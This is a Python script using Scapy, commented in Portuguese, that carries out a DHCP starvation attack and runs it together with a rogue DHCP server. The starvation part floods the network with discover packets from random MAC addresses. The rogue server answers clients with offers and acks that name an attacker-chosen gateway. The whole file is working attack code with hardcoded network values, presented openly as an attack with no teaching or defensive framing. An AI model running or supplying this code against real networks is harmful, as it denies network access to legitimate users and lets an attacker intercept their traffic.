from scapy.all import *
import threading
import time

def dhcp_starvation(iface, delay=0.1):
    conf.checkIPaddr = False 

    while True:
        DHCP_DISCOVER = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=0x0800) \
                    / IP(src='0.0.0.0', dst='255.255.255.255') \
                    / UDP(dport=67, sport=68) \
                    / BOOTP(op=1, chaddr=RandMAC()) \
                    / DHCP(options=[('message-type', 'discover'), ('end')])

        sendp(DHCP_DISCOVER, iface=iface,inter=0.01, verbose=1)


def malicious_dhcp_server(interface, server_ip, start_ip, end_ip, subnet_mask, router):
    def dhcp_server(pkt):
        if DHCP in pkt and pkt[DHCP].options[0][1] == 1:  # DHCP Discover
            print(f"Received DHCP Discover from {pkt[Ether].src}")
            dhcp_offer = Ether(src=get_if_hwaddr(interface), dst=pkt[Ether].src) / \
                         IP(src=server_ip, dst="255.255.255.255") / \
                         UDP(sport=67, dport=68) / \
                         BOOTP(op=2, yiaddr=start_ip, siaddr=server_ip, chaddr=pkt[Ether].src) / \
                         DHCP(options=[("message-type", "offer"), 
                                       ("subnet_mask", subnet_mask), 
                                       ("router", router), 
                                       ("end")])
            sendp(dhcp_offer, iface=interface, verbose=0)

        elif DHCP in pkt and pkt[DHCP].options[0][1] == 3:  # DHCP Request
            print(f"Received DHCP Request from {pkt[Ether].src}")
            dhcp_ack = Ether(src=get_if_hwaddr(interface), dst=pkt[Ether].src) / \
                       IP(src=server_ip, dst="255.255.255.255") / \
                       UDP(sport=67, dport=68) / \
                       BOOTP(op=2, yiaddr=start_ip, siaddr=server_ip, chaddr=pkt[Ether].src) / \
                       DHCP(options=[("message-type", "ack"), 
                                     ("subnet_mask", subnet_mask), 
                                     ("router", router), 
                                     ("end")])
            sendp(dhcp_ack, iface=interface, verbose=0)

    sniff(filter="udp and (port 67 or 68)", prn=dhcp_server, store=0, iface=interface)

if __name__ == "__main__":
    # Valores diretamente inseridos
    interface = "eth0"   # Interface de rede a ser usada para o ataque
    server_ip = "192.168.0.254"  # Endereço IP do servidor DHCP malicioso
    start_ip = "192.168.0.100"  # Primeiro IP a ser oferecido
    end_ip = "192.168.0.200"  # Último IP a ser oferecido
    subnet_mask = "255.255.255.0"  # Máscara de sub-rede
    router = "192.168.0.1"  # Gateway padrão

    # Configuração do atraso entre pacotes para o DHCP Starvation
    delay = 0.1  # Valor do atraso entre pacotes em segundos

    # Iniciar DHCP Starvation em um thread separado
    starvation_thread = threading.Thread(target=dhcp_starvation, args=(interface, delay))
    starvation_thread.start()

    # Iniciar Rogue DHCP Server
    malicious_dhcp_server(interface, server_ip, start_ip, end_ip, subnet_mask, router)

